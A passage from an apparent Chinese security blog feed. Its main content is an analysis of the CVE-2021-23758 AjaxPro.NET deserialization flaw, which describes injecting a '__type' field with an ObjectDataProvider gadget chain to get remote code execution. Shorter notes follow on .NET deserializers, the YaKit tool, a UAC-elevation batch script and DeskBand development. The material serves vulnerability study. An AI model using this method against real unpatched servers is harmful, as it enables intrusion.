Native=0x06F5A7C0+0x4F)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A540+0x31)</span><br><span class="line"> Chanjet.TP.WebServer.dll!Mono.WebServer.MonoWorkerRequest.ProcessRequest() (IL≈0x000F, Native=0x06F59E20+0x37)</span><br><span class="line"> Chanjet.TP.WebServer.dll!Mono.WebServer.BaseApplicationHost.ProcessRequest(Mono.WebServer.MonoWorkerRequest mwr) (IL≈0x002A, Native=0x06F59C38+0x5E)</span><br><span class="line"> Chanjet.TP.WebServer.FastCgi.exe!Mono.WebServer.FastCgi.ApplicationHost.ProcessRequest(Mono.WebServer.FastCgi.Responder responder) (IL=0x0055, Native=0x06F53E50+0x10D)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.StackBuilderSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL=???, Native=0x6A0D42B0+0x1F4)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.ServerObjectTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0048, Native=0x6A0D4238+0x67)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.ServerContextTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x004F, Native=0x6A0D413C+0x8B)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessageCallback(object[] args) (IL≈0x0059, Native=0x6A0D3E94+0x98)</span><br><span class="line"> mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x001F, Native=0x6A0D3D40+0xA1)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL≈0x0042, Native=0x6A0EAF38+0x93)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0047, Native=0x6A0D2F50+0xF4)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatchCallback(object[] args) (IL≈0x0016, Native=0x6A0D77EC+0x84)</span><br><span class="line"> mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD)</span><br><span class="line"> [程序域转换]</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0002, Native=0x6A0D2E5C+0x7A)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0053, Native=0x6A0D24AC+0x9A)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink ms, System.Runtime.Remoting.Messaging.IMessage reqMsg, System.Runtime.Remoting.Contexts.ArrayWithSize proxySinks, System.Threading.Thread currentThread, System.Runtime.Remoting.Contexts.Context currentContext, bool bSkippingContextChain) (IL≈0x003A, Native=0x6A0D22EC+0x51)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.InternalInvoke(System.Runtime.Remoting.Messaging.IMethodCallMessage reqMcmMsg, bool useDispatchMessage, int callType) (IL=???, Native=0x6A0D2070+0x1DE)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.Invoke(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL=epilog, Native=0x6A0D2000+0x69)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(ref System.Runtime.Remoting.Proxies.MessageData msgData, int type) (IL≈0x0155, Native=0x6A0D1DA0+0xF4)</span><br><span class="line"> Chanjet.TP.WebServer.FastCGI.exe!Mono.WebServer.FastCgi.Responder.Process() (IL=0x0068, Native=0x039C3988+0x162)</span><br><span class="line"> Chanjet.TP.WebServer.FastCGI.exe!Mono.FastCgi.ResponderRequest.Worker(object state) (IL≈0x0002, Native=0x039C37C8+0x4B)</span><br><span class="line"> mscorlib.dll!System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(object state) (IL=epilog, Native=0x6A0F0960+0x44)</span><br><span class="line"> mscorlib.dll!System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL≈0x0079, Native=0x6A047D70+0xC4)</span><br><span class="line"> mscorlib.dll!System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL=epilog, Native=0x6A047D50+0x17)</span><br><span class="line"> mscorlib.dll!System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem() (IL=epilog, Native=0x6A0F09B0+0x45)</span><br><span class="line"> mscorlib.dll!System.Threading.ThreadPoolWorkQueue.Dispatch() (IL=0x00A4, Native=0x6A0E1920+0x19D)</span><br><span class="line"> mscorlib.dll!System.Threading._ThreadPoolWaitCallback.PerformWaitCallback() (IL=epilog, Native=0x6A0E1910+0xB)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上所示一大堆，只需要关注其中的几个就可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type)</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type)</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() </span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run()</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)</span><br></pre></td></tr></table></figure><h4 id="堆栈-漏"><a href="#堆栈-漏" class="headerlink" title="堆栈&amp;漏"></a>堆栈&amp;漏</h4><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>从上面分析可知，如果要控制反序列化操作的 <code>Type</code>，那么必须保证 Ajax 处理函数的输出参数类型是可控的，而 <code>GetStoreWarehouseByStore</code> 函数的输入参数为 <code>Objectt</code> 类型，符合当前漏洞要求：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416155500241.png" class="" title="GetStoreWarehouseByStore"><p>修改请求数据包，加入<code>__type</code>参数，并加入<code>ObjectDataProvider</code>利用链，发送数据包后成功触发RCE。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416162012157.png" class="" title="image-20240416162012157"><p>发送 Ajax 请求后，首先会进入继承于 <code>IHttpHandler</code> 接口的类 <code>AjaxSyncHttpHandler</code>，调用函数 <code>ProcessRequest</code> 进行处理：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416144921138.png" class="" title="ProcessRequest"><p>接着进入<code>XmlHttpRequestProcessor.RetreiveParameters</code>函数：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416145606460.png" class="" title="RetreiveParameters"><p>其中第23行通过<code>method.GetParameters</code>加载自定义的全部Ajax Method，即所有采用<code>[AjaxPro.AjaxMethod]</code>进行装饰的函数，比如本次漏洞的 <code>GetStoreWarehouseByStore</code> 方法：</p><p>上述 parameters 的类型为:</p><p><code>&#123;System.Reflection.RuntimeParameterInfo&#125;System.Reflection.ParameterInfo &#123;System.Reflection.RuntimeParameterInfo&#125;</code></p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150109088.png" class="" title="parameters"><p>自定义的 方法：</p><p>((System.Reflection.RuntimeMethodInfo)parameters[0].MemberImpl).m_name &#x3D; “GetStoreWarehouseByStore”</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150303537.png" class="" title="image-20240416150303537"><p>接着往下走，第120行通过<code>JavaScriptDeserializer.DeserializeFromJson</code>反序列化得到一个<code>JavaScriptObject</code>对象，这里指定了<code>Type</code>类型，继续往下看：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150611131.png" class="" title="DeserializeFromJson"><p>进入 <code>JavaScriptDeserizlizer.Deserializer</code> ：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150859147.png" class="" title="JavaScriptDeserizlizer.Deserializer"><p>这里判断是否存在<code>__type</code>参数，如果存在且通过<code>__type</code>获取的<code>Type</code>对象继承于处理函数输入参数数据类型（<code>type.IsAssignableFrom(t)</code>），可以修改反序列化的<code>type</code>对象。继续往下走，最终调用<code>DeserializeCustomObject</code>函数完成处理，处理过程与.NET JavaScriptSerializer等其他反序列化方式非常类似。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416151403563.png" class="" title="image-20240416151403563"><p>在新版本的 <code>AjaxPro.Net</code> 中，对自定义反序列化类型的操作加入了配置限制，只有预先配置好的<code>Type</code>类型才能进行修改，导致恶意类无法被插入。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240418092602485.png" class="" title="Add Type Check">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述： CVE-2021-23758 Ajax.NET Professional 中的 RCE 反序列化漏洞分析及说明&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>【.Net】反序列化漏洞探索</title>
    <link href="http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E7%B4%A2/"/>
    <id>http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E7%B4%A2/</id>
    <published>2024-04-15T10:27:03.494Z</published>
    <updated>2024-05-11T09:56:03.752Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：.Net 反序列及漏洞相关自洽记录。</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="开源项目和文章推荐"><a href="#开源项目和文章推荐" class="headerlink" title="开源项目和文章推荐"></a>开源项目和文章推荐</h2><p>项目：</p><ol><li><a href="https://github.com/Ivan1ee/NET-Deserialize/tree/master">Ivan1ee&#x2F;NET-Deserialize: 总结了 20+.Net 反序列化文章，持续更新</a></li></ol><p>文章：</p><ol><li><a href="https://cn-sec.com/archives/675298.html">【最新漏洞预警】开源组件漏洞之 CVE-2021-23758 AjaxPro.NET 反序列化漏洞 | CN-SEC 中文网</a></li><li><a href="https://www.h3c.com/cn/d_202112/1519681_30003_0.htm">AjaxPro.NET 反序列化漏洞(CVE-2021-23758)-新华三集团-H3C</a></li></ol><h2 id="反序列化说明"><a href="#反序列化说明" class="headerlink" title="反序列化说明"></a>反序列化说明</h2><p>在 .NET 中，反序列化漏洞通常是由于不安全地处理序列化的数据而产生的。当应用程序反序列化来自不受信任来源的数据时，攻击者可能会构造恶意的序列化数据，从而在反序列化过程中触发任意代码执行或其他恶意行为。</p><p>.NET 框架提供了多种序列化机制，如二进制格式化程序（BinaryFormatter）、SOAP 格式化程序（SoapFormatter）、数据契约序列化程序（DataContractSerializer）等。这些序列化机制在默认情况下可能不安全，因为它们可能允许攻击者利用某些类型的安全漏洞。</p><h2 id="Net-反序列化常见相关函数"><a href="#Net-反序列化常见相关函数" class="headerlink" title=".Net 反序列化常见相关函数"></a>.Net 反序列化常见相关函数</h2><p>目前已经有发现的相关反序列漏洞涉及的函数包括但不限于以下所示相关函数：</p><ol><li>XmlSerializer</li><li>NetDataContractSerializer</li><li>FastJson</li><li>BinaryFormatter</li><li>Json.Net</li><li>.Net Remoting</li><li>SoapFormatter</li><li>DataContractSerializer </li><li>LosFormatter</li><li>ObjectStateFormatter <a href="%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.md">【.Net】可执行文件结构分析.md</a> </li><li>JavaScriptSerializer</li></ol><h2 id="堆栈实例"><a href="#堆栈实例" class="headerlink" title="堆栈实例"></a>堆栈实例</h2><p>可查看文章 <a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/" title="【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞">【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞</a> 中的分析。关键调用如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) </span><br><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) </span><br><span class="line">AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() </span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() </span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：.Net 反序列及漏洞相关自洽记录。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="CSharp" scheme="http://example.com/categories/B-Code/CSharp/"/>
    
    
    <category term=".Net" scheme="http://example.com/tags/Net/"/>
    
  </entry>
  
  <entry>
    <title>【工具】YaKit 单兵渗透测试工具</title>
    <link href="http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</id>
    <published>2024-04-11T16:00:00.000Z</published>
    <updated>2024-04-16T01:32:50.487Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：单兵作战渗透工具介绍——Yakit</p></blockquote><span id="more"></span><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://www.yaklang.io/products/download_and_install/#download">下载安装与更新配置 | Yak Program Language</a></p><h2 id="使用探索"><a href="#使用探索" class="headerlink" title="使用探索"></a>使用探索</h2><h3 id="poc-如何使用"><a href="#poc-如何使用" class="headerlink" title="poc 如何使用"></a>poc 如何使用</h3><p>渗透测试同居 -&gt; Web Fuzzer -&gt; 把相应的 POC 代码粘贴到 Request 中，然后店家发送请求即可。</p><img src="/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20240415105106436.png" class="" title="image-20240415105106436">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：单兵作战渗透工具介绍——Yakit&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="G_工具" scheme="http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>【批处理】获取 UAC 权限</title>
    <link href="http://example.com/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E8%8E%B7%E5%8F%96uac%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E8%8E%B7%E5%8F%96uac%E6%9D%83%E9%99%90/</id>
    <published>2024-04-09T09:37:41.349Z</published>
    <updated>2024-04-12T06:47:24.767Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：批处理获取UAC权限脚本</p></blockquote><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exist <span class="string">&quot;%SystemRoot%\system32\atl100.dll&quot;</span> (</span><br><span class="line">    ::xcopy atl100.dll D:\ /-y</span><br><span class="line">    ::<span class="built_in">echo</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">        xcopy atl100.dll C:\Windows\System32 /-y </span><br><span class="line">        regsvr32 atl100.dll /n /i</span><br><span class="line">     )</span><br><span class="line"></span><br><span class="line">setlocal</span><br><span class="line"><span class="built_in">set</span> uac=~uac_permission_tmp_%random%</span><br><span class="line">md <span class="string">&quot;%SystemRoot%\system32\%uac%&quot;</span> 2&gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 (</span><br><span class="line">    rd <span class="string">&quot;%SystemRoot%\system32\%uac%&quot;</span> &gt;nul 2&gt;nul ) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="built_in">set</span> uac = CreateObject^(<span class="string">&quot;Shell.Application&quot;</span>^)&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> uac.ShellExecute <span class="string">&quot;%~s0&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;runas&quot;</span>,1 &gt;&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> WScript.Quit &gt;&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="string">&quot;%temp%\%uac%.vbs&quot;</span> /f</span><br><span class="line">    del /f /q <span class="string">&quot;%temp%\%uac%.vbs&quot;</span> &amp; <span class="built_in">exit</span> )</span><br><span class="line">endlocal</span><br><span class="line"></span><br><span class="line">:Run</span><br><span class="line">:: 下面代码替换为自己的</span><br><span class="line">regsvr32 <span class="string">&quot;%~dp0%LockKeys.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：批处理获取UAC权限脚本&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="批处理" scheme="http://example.com/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【WIN】DeskBand 扫盲</title>
    <link href="http://example.com/A_OS/Windows/Shell%E6%89%A9%E5%B1%95/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/"/>
    <id>http://example.com/A_OS/Windows/Shell%E6%89%A9%E5%B1%95/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/</id>
    <published>2024-04-09T09:31:12.470Z</published>
    <updated>2024-04-28T08:53:59.233Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Windows DeskBand 开发的知识点及项目介绍</p></blockquote><span id="more"></span><p>[toc]</p><h2 id="DeskBand"><a href="#DeskBand" class="headerlink" title="DeskBand"></a>DeskBand</h2><p>DeskBand 指 Windows 操作系统上工具栏按钮，可以通过在工具栏添加按钮来添加一些功能。如下图所示360开发的DeskBand——360U盘助手。</p><img src="/A_OS/Windows/Shell%E6%89%A9%E5%B1%95/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/image-20240409174239559.png" class="" title="image-20240409174239559"><h2 id="开发说明"><a href="#开发说明" class="headerlink" title="开发说明"></a>开发说明</h2><p>参考文章：</p><ul><li><a href="https://blog.csdn.net/leehong2005/article/details/8608783">DeskBand实现之——对象介绍-CSDN博客</a></li></ul><h2 id="如何创建"><a href="#如何创建" class="headerlink" title="如何创建"></a>如何创建</h2><p>开源项目：</p><ul><li><a href="https://github.com/microsoft/Windows-classic-samples/tree/a47da3d4551b74bb8cc1f4c7447445ac594afb44/Samples/Win7Samples/winui/shell/shellextensibility/deskbands">Windows-classic-samples&#x2F;Samples&#x2F;Win7Samples&#x2F;winui&#x2F;shell&#x2F;shellextensibility&#x2F;deskbands at a47da3d4551b74bb8cc1f4c7447445ac594afb44 · microsoft&#x2F;Windows-classic-samples</a></li><li><a href="https://github.com/AzureGreen/NetView?tab=readme-ov-file">AzureGreen&#x2F;NetView: a deskband plus-in which can view real-time net speed</a></li><li><a href="https://github.com/slivermeteor/LockKeys">slivermeteor&#x2F;LockKeys: The windows explorer extension to show the status of Capslock and Numlock in the Taskbar.</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Windows DeskBand 开发的知识点及项目介绍&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="Shell扩展" scheme="http://example.com/categories/A-OS/Windows/Shell%E6%89%A9%E5%B1%95/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="DeskBand" scheme="http://example.com/tags/DeskBand/"/>
    
  </entry>
  
  <entry>
    <title>【工具】SFTP 工具分享</title>
    <link href="http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91SFTP%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91SFTP%E5%B7%A5%E5%85%B7/</id>
    <published>2024-04-09T06:34:21.903Z</published>
    <updated>2024-04-12T06:47:10.423Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：用户本地搭建 SFTP 的小工具。</p></blockquote><span id="more"></span><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w">https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w</a><br>提取码：hi0w</p></blockquote><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>参考文章：</p><ul><li><a 